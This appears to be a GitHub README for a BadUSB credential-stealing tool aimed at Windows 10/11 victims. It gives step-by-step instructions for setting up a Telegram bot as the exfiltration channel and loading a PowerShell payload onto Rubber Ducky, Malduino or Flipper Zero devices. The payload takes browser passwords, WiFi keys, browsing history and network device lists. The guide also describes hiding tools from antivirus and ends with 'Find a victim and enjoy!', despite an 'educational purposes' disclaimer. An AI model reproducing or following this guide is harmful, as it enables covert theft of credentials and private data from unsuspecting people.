# BadUSB_passStealer

## Warning ⚠️
Everything in this repository is **strictly** for educational purposes. **I am not responsible** for any stolen data. **You are responsible** for your actions when using this script for **BadUSB**.

## About ℹ️
This **script** allows you to steal the following **information**:
* Browser **passwords** (Chrome, Firefox, Opera);
* **WiFi** passwords;
* Browser **history** from the last 7 days
* A **list** of all **devices** connected to the victim's network

### Attention Arduino users!
I stopped upgrading .ino scripts. If you want, you can convert Ducky Scripts [here](https://duckify.huhn.me/).

### NB #1 (for Arduino BadUSB)
Sometimes, you will see something like this:
```cpp
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(173);
Keyboard.releaseAll();
```
This is used to type characters like "@" and "\\". However, it depends on the computer's keyboard layout, so adapt these characters using this [site](https://www.csee.umbc.edu/portal/help/theory/ascii.txt) and the sequence you actually use to type them. Alternatively, switch the keyboard layout to French.

### US Layout
For a US layout, use the following replacements:
For "\\":
```
Keyboard.press(92);
Keyboard.releaseAll();
```
For "@":
```
Keyboard.press(64);
Keyboard.releaseAll();
```

### NB #2
You can customize the **delay** according to how fast you plug in the **BadUSB**.

### NB #3
When you plug the BadUSB into a PC, you must wait for the Caps Lock to flash before unplugging it.

# Getting Started ✔️

## Requirements
1. A **BadUSB**.
2. Install **Arduino software** [here](https://www.arduino.cc/en/software) (if using an Arduino-based BadUSB).
3. A Telegram account.
4. A victim using **Windows 10/11** on their PC.

# Setting up a Telegram bot to upload files

## Create a Telegram bot
1. Open your browser, go to [Telegram Web](https://web.telegram.org/), and log in.
2. Search for **@BotFather** in the Telegram search bar.
3. Click **Start** to begin a conversation with **@BotFather**.
4. Send `/newbot` to **@BotFather**.
5. Send your bot’s name to **@BotFather**.
6. Send your bot’s username to **@BotFather**.
7. **@BotFather** will respond:
   > Done! Congratulations on your new bot. You will find it at t.me/BOT_USERNAME. You can now add a description, about section, and profile picture for your bot. See /help for a list of commands.
   > Use this token to access the HTTP API:
   > **API_ACCESS_TOKEN**
   > For a description of the Bot API, see this page: https://core.telegram.org/bots/api
8. Now start a conversation with your bot by clicking on **t.me/BOT_USERNAME** in **@BotFather** and clicking **Start**. Your bot will now appear in your chat list.

## Get a Telegram API access token
Your Telegram API access token is provided in **@BotFather**'s response.

## Get your Telegram chat ID
1. Open your browser and replace `API_ACCESS_TOKEN` in the following URL:

    ```
    https://api.telegram.org/bot<API_ACCESS_TOKEN>/getUpdates?offset=0
    ```
2. Send any message to your bot in Telegram.
3. Refresh the API tab.
4. Identify your numerical chat ID in the chat JSON object. Example:
  
    ```
    "message":{"message_id":2,"from":{"id":123456789,"is_bot":false,"first_name":"user","language_code":"en"},"chat":{"id":123456789,"first_name":"user","type":"private"},"date":1696077493,"text":"Hi"}}
    ```
    Your chat ID is **123456789**.

# Installation for Rubber Ducky, Malduino W, and Flipper Zero
1. Download this repository.

    * **Linux:**
      ```
      git clone https://github.com/tuconnaisyouknow/BadUSB_passStealer
      cd BadUSB_passStealer
      ```
    
    * **Windows:** Click the green button at the top right of the main page, then click "Download Zip" and extract the zip file.

2. Replace **\<TOKEN\>** and **\<CHAT_ID\>** in [ps.ps1](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/ps.ps1).

3. Upload your `ps.ps1` file to obtain a downloadable link.

4. Replace **LINK** in [BadUSB_passStealer_upload.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/BadUSB_passStealer_upload.txt) with the `ps.ps1` link.

5. Place the or `.txt` file in your **BadUSB**.

6. Find a victim and enjoy!

# Installation for Malduino 2 BadUSB (with mass storage)
### **Warning** ⚠️: This version is deprecated and will no longer be updated!

1. Download this repository.

    * **Linux:**
      ```
      git clone https://github.com/tuconnaisyouknow/BadUSB_passStealer
      cd BadUSB_passStealer
      ```
    
    * **Windows:** Click the green button at the top right of the main page, then click "Download Zip" and extract the zip file.

2. Upgrade the Malduino firmware following these [instructions](https://docs.maltronics.com/devices/malduino-2/firmware-upgrade).

3. Modify `preferences.json` in your MMS by setting:
    ```
    "enable_msc": true,
    ```

4. In your MMS root directory, create the following directories: `dump/` and `passStealer/`.

5. Replace **TOKEN** and **CHAT_ID** in [telegram_uploader.py](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/upload/telegram_uploader.py).

6. Convert `telegram_uploader.py` into an executable:
    ```
    pip install pyinstaller
    pyinstaller --onefile -w telegram_uploader.py
    ```

7. Download 7-Zip Extra: standalone console version, 7z DLL, Plugin for Far Manager [here](https://www.7-zip.org/download.html).

8. Copy the necessary files into your MMS directories as specified in the repository.

9. Find a victim and enjoy!

**Explanation:** Nirsoft Tools are encrypted to avoid antivirus detection, so we use 7-Zip to extract them via command line. The `dump` folder stores all stolen information.

# Nirsoft tools 🧰
You can download Nirsoft tools here:
* [WebBrowserPassView.exe](https://www.nirsoft.net/protected_downloads/passreccommandline.zip) (User: `download` ; Password: `nirsoft123!`)
* [WNetWatcher.exe](https://www.nirsoft.net/utils/wireless_network_watcher.html)
* [BrowsingHistoryView.exe](https://www.nirsoft.net/utils/browsing_history_view.html)
* [WirelessKeyView.exe](https://www.nirsoft.net/utils/wireless_key.html)

